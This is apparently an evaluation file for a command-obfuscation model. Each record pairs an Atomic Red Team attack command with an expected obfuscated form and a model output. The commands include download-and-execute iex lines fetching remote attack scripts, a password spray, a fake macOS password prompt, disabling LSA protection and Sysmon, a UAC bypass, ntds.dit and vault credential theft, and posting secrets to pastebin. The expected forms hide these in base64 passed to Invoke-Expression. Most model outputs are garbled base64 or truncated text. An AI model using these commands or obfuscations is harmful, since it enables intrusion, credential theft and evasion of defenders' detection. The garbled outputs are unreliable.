{"input": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUxvY2F0aW9uICJQYXRoVG9BdG9taWNzRm9sZGVyIgouXFQxNTcyXHNyY1xUMTU3Mi1kb2gtYmVhY29uLnBzMSAtRG9oU2VydmVyICN7ZG9oX3NlcnZlcn0gLURvbWFpbiAje2RvbWFpbn0gLVN1YmRvbWFpbiAje3N1YmRvbWFpbn0gLVF1ZXJ5VHlwZSAje3F1ZXJ5X3R5cGV9IC1DMkludGVydmFsICN7YzJfaW50ZXJ2YWx9IC1DMkppdHRlciAje2MyX2ppdHRlcn0gLVJ1blRpbWUgI3tydW50aW1lfQ==')) | Invoke-Expression\"", "output_model": "Set-Location PathToAtomicsFolder .\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer -Domain -Subdomain -QueryType -C2Interval -C2Jitter -Runtime<|"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"", "output_model": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args}\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe -f (objectcategory=group)", "output_model": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe -f (objectcategory=group) \"\" -f (objectcategory=group) \\\"\"\\\"\"\"P\"\"t\"\"h\"\"T\"\"o\"\"A\"\"t\"\"o\"\"m\"\"i\"\"c\"\"s\"\"F\"\"o\"\"l\"\"d\"\"e\"\"r\"\"\\.\\.\\.E\"\""}
{"input": "bcdedit /set testsigning on", "output_expected": "bcdedit /set testsigning \"o\"\"n\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmlsZSAje3BvcnQgLW9ubHkgYXR0cjIi')) | Invoke-Expression\""}
{"input": "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o", "output_expected": "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o", "output_model": "esentutl.exe {PATH_SMB:.source.exe} /y {PATH_SMB:.dest.exe} /d /o\n```\n## Atomic Test #2 - esentutl.exe with a remote file path\nesetnult.exe is used to extract or install source files from a .zip archive, or to modify a binary executable file. This test simulates an attacker copying"}
{"input": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF\n", "output_expected": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b3RhdGlvbmFsX1N0cmluZyBQYXJhbnREb2t1dWxzfSBmaWxlIC9wcmVtaWNpcyAtLm9yZyAvZmlyZXdhbGwgL"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5nIGlzIHRoZSBleGFtcGxlLmV4ZSAiUE9TVCAje2JvbWFuX3RpbWUgPSAwIC0+IEhlYWRlcnlNdWNrZXQgMjEyMDAi"}
{"input": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\"\nrundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\"\n", "output_expected": "rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\\T1218.011\\src\\index.hta rundll32.exe url.dll,OpenURL PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs", "output_model": "rundll32.exe url.dll,OpenURL PathToAtomicsFolder\\T1218.011\\src\\index.hta rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords", "output_expected": "iex(new-object -noninteractive domainpassspray -consoleoutput net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1) -emptypasswords", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') domainpassspray -consoleoutput -noninteractive -emptypasswords<"}
{"input": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n", "output_expected": "reg HKLMSYSTEMCurrentControlSetControlLSA /v RunAsPPL /t REG_DWORD /d 0 /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSE9SZXNvdXJjZU5hbWUSCkludmFsaWRHZWNrIC1MICAgI3twYXlsb2FkX2luZGV4ICAgI3tcbmV4cG9yd"}
{"input": "Remove-SmbShare -Name #{share_name}\nRemove-FileShare -Name #{share_name}\n", "output_expected": "Remove-SmbShare -Name", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LWNvbnN1bHBhdG9zX3Jvb3QgICAgI3tmaWxlfSAje3tpbm5lciAiIFsgZmllZF9zaGVsbCAj')) | Invoke-Expression\""}
{"input": "try{ \n  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})\n  Add-Content \"$env:APPDATA\\slipDays.bak\" #{days_to_modify}\n}\ncatch {exit 1}\n", "output_expected": "try{ Set-Date -Date (Get-Date).AddDays(", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAuICN7ZXhlYyAtICIiIDwvbG9jYWxob3N0fQ==')) | Invoke-Expression\""}
{"input": "extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXh0cmFjMzIuZXhlIC9DIHtQQVRIX0FCU09MVVRFOi5zb3VyY2UuZXhlfSB7UEFUSF9BQlNPTFVURTouZGVzdC5leGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnNvbGUgLWNsaWVudCAiQm9keTxHcmFwaAogI3tmaWxlIC1kYXRhIC5leGVjX2ludGVybmFs')) | Invoke-Expression\"<"}
{"input": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450 \n", "output_expected": "netsh \\\"a\\\"\\\"d\\\"\\\"v\\\"\\\"f\\\"\\\"i\\\"\\\"r\\\"\\\"e\\\"\\\"w\\\"\\\"a\\\"\\\"l\\\"\\\"l\\\" firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3BlcmF0aW9uIHtub2RlLmNvbQ==')) | Invoke-Expression\""}
{"input": "fltMC.exe unload SysmonDrv", "output_expected": "fltMC.exe SysmonDrv unload", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIC1Tb3VyY2UgQW5kcm9pZCAtTWljcm9zb2Z0fQ==')) | Invoke-Expression\"\n```"}
{"input": "echo \"#{script_command}\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f\n", "output_expected": "echo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IC9wYXRofSAje2NvbHVtbCAjIC9Qcm9ncmFtbCIgI3tpbm5lcndpZmFsdH0gLUNvbHVtbCBTZWNyZXRz')) | In"}
{"input": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"#{monitor_dll}\" /t REG_SZ /f\n", "output_expected": "reg add hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam /v Driver /d", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG51bWJlc3RyaWN0LXBhdG9tYXNzIHtcT2MgSGFzaC1QYWdlIC1QaWFuZCBsb2dvdCAiU3RyIDxQb3NpdGVy"}
{"input": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}", "output_expected": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit \\\"/\\\"\\\"d\\\" {PATH_ABSOLUTE:.dit}", "output_model": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}"}
{"input": "powershell -executionpolicy bypass -command \"#{file_path}\\Get-Inbox.ps1\" -file #{output_file}\n", "output_expected": "powershell -executionpolicy bypass -command", "output_model": "powershell -executionpolicy bypass -command \"\",\"\"Set-ExecutionPolicy Bypass -Scope Process -Force; $a = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFNzaWdub3RlcjogZXhlIC9hbGxvY2tzIHtcImV4aXN0"}
{"input": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}", "output_expected": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VG9wdWxhdGlvbjogI3tmaWxlIC1jb250ZXh0LXVzZXJuYW1lfQ==')) | Invoke-Expression\"\n```"}
{"input": "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"#{image_file}\" -Out \"$HOME\\result.ps1\"\n$scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw\n$base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"\n$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }\n$base64Strings | Set-Content \"$HOME\\decoded.ps1\"\n$decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw\n$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))\n$textPattern = '^.+'  \n$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }\n$scriptPath = \"$HOME\\textExtraction.ps1\"\n$textMatches -join '' | Set-Content -Path $scriptPath\n. \"$HOME\\textExtraction.ps1\"\n", "output_expected": "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWVkaWNhcmRXQnJlYWRTdGF0ZS5leGVjdXRpb25fbmFtZSAiI3MgICB7CiAgICAvLyIsICIje2NvbSI=')) | Invoke-Expression\"<|"}
{"input": "powershell.exe -c \"Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }\"\n", "output_expected": "powershell.exe -c \"Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }\"", "output_model": "powershell.exe -c Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include *.doc*,*.xls*,*.txt,*.pdf -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$"}
{"input": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}\n", "output_expected": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHNvbXBsZXRcU3VjY2Vzcy5leGUgLWxhbmd1YWdlIC1maWxlIiAvdGVzdC90aWNrZXQtbm9kZS5pbnQgcHJvamV"}
{"input": "vaultcmd /listcreds:\"Windows Credentials\" /all\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dmF1bHRjbWQgL2xpc3RjcmVkczoiV2luZG93cyBDcmVkZW50aWFscyIgL2FsbA==')) | Invoke-Expression\"", "output_model": "vaultcmd \"\\\"/listcreds:\\\"Windows Credentials\\\".exe\" /all"}
{"input": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n", "output_expected": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHJvb3QgY29tbWVycyAje2xpbmsuZXhlIC1jb2RlIC9hcGFjaGUiIHNpemVTaGVsbCB7ZmllbGRzX3BhdG"}
{"input": "$apiKey = \"#{api_key}\"\n$content = \"secrets, api keys, passwords...\"\n$url = \"https://pastebin.com/api/api_post.php\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \"paste\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \"Your paste URL: $response\"\n", "output_expected": "$apiKey =", "output_model": "$apiKey = \"\\\"s\"\"e\"\"c\"\"r\"\"e\"\"t\"\"s\",\"\"\" \",\"a\"\"p\"\"i\"\" \"\"k\"\"e\"\"y\"\"s\",\"\"\" \",p\"\"a\"\"ss\"\"w\"\"o\"\"r\"\"d\"\"s...\"\n$content = \"secrets, api keys, passwords...\"\n$url = https://pastebin.com/api/api_post.php"}
{"input": "rundll32.exe #{dll_file},krnl\n", "output_expected": "rundll32", "output_model": "rundll32.exe \"\" -{d}ll 32,krnl \"\\\"\", \"\\\"\"-{"}
{"input": "New-LocalUser -Name \"Administrator \" -NoPassword", "output_expected": "New-LocalUser -Name \"Administrator \" -NoPassword", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFoAKgBFAF4AUwBlACIAIgBpADsAIgAvAE0ATABLAEkARgAgAFIAVABOAHYASQBEACIANQAgACIAJggAX0dFVF9VUkwAD5WX18AIABNAG8"}
{"input": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\";  fi\n", "output_expected": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\";  fi", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1Nvbm5lY3Rpb25zLUFsbEJvb2tpbmdfZXhlICdQcm9jZWRfTGVybW9kaWxhciAiS2V5IHRleHQtVmVjd"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe --pipe 5", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqdGFyZ2V0IC1cYWRtaW5AYm9vdHN0YXRpYy5jYWxsb3dlci5hcnJheS5wYXBl')) | Invoke-Expression\""}
{"input": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "output_expected": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"", "output_model": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \""}
{"input": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}", "output_expected": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZC9Nb2R1bGUgLVkgQW5hbnRvbWFyXFRoZSBleGUgIiAje2xldCB7dmlzaWJsZWhkYmFi')) | Invoke-Expression\"<|endoftext|"}
{"input": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address\n", "output_expected": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"", "output_model": "$address = (& PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll | Out-String | Select-String -Pattern VirtualAddress: (w+)).Matches.Groups[1].Value & PathToAtomicsFolder\\T1055\\bin\\x64\\R"}
{"input": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"\n", "output_expected": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmxhbGwgIC9QcmVkaXJlY3RpdmUuZmlsZS5leGVjIiAtPiAvT01TRVBLA1NIRVJfUEFUSF9CYWNrIFxzY2hlbmEgLWd"}
{"input": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"", "output_expected": "msdt.exe /id PCWDiagnostic force /skip /param IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVudGltZSBmaXJzdC5leHByaWNlIC9qb2IuY3NzIC1jcnlwdGVkIC9sb2dpbiAjeiIKfQ==')) | Invoke-Expression\"\n```\n##"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe", "output_model": "\\\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\\\"  \\\"-\\\"default \\\"-\\\"s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"}
{"input": "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt", "output_expected": "certutil.exe -urlcache -f \"{REMOTEU\"RL:.ps1} {PATH_ABSOLUTE}:ttt", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQvZmlyc3QtY29sbGVjdGlvbn0uZXhlICN7dHJhbnNhbC5leGUgLWdyYWRpZW50IHsNCnBvcnRzID0gc2Ftc"}
{"input": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF\n", "output_expected": "PWD_SPOOF=$(osascript echo $PWD_SPOOF -e display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer)", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0cmlldC1jZXJ0IHNob3BwaW5nLmFzfQ==')) | Invoke-Expression\"\n$PWD_SPOOF=(osa   script -e  display   dialog To   perform a securi"}
{"input": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n", "output_expected": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"", "output_model": "Import-Module -Name AzureAD $PWord = ConvertTo-SecureString -String \"\\\"\\\"\\\"\" -AsPlainText -Force $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\\\"\\\"<|end"}
{"input": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" #{remote_file} #{destination_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y21kIC9jICJQYXRoVG9BdG9taWNzRm9sZGVyXC4uXEV4dGVybmFsUGF5bG9hZHNcbmltZ3JhYi5leGUiICN7cmVtb3RlX2ZpbGV9ICN7ZGVzdGluYXRpb25fcGF0aH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGFuZCAiSE9wIC0gU2ltYWdlfQ==')) | Invoke-Expression\""}
{"input": "fltMC.exe unload SysmonDrv", "output_expected": "fltMC.exe unl\"oad\" SysmonDrv", "output_model": "fltMC.exe \"un\"load SysmonDrv\n```\n## Atomic CMD Shell\n```\npowershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZW5jb2RlIHN0YXR1cw==')) | Invoke-Expression\"\n```\n##"}
{"input": "$extList = #{extension_id}\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n", "output_expected": "$extList", "output_model": "$extList =  foreach ($extension in $extList) {   New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force   New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name update_url -Value https://clients2."}
{"input": "$file = Get-Item $env:temp\\T1564.001-10.txt -Force\n$file.attributes='System'\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGZpbGUgPSBHZXQtSXRlbSAkZW52OnRlbXBcVDE1NjQuMDAxLTEwLnR4dCAtRm9yY2UKJGZpbGUuYXR0cmlidXRlcz0nU3lzdGVtJw==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtYXdGaWx0ZXIgMjAwMCAtcHNpIC9zaCAvZmlsZV9maWxlfQ==')) | Invoke-Expression\""}
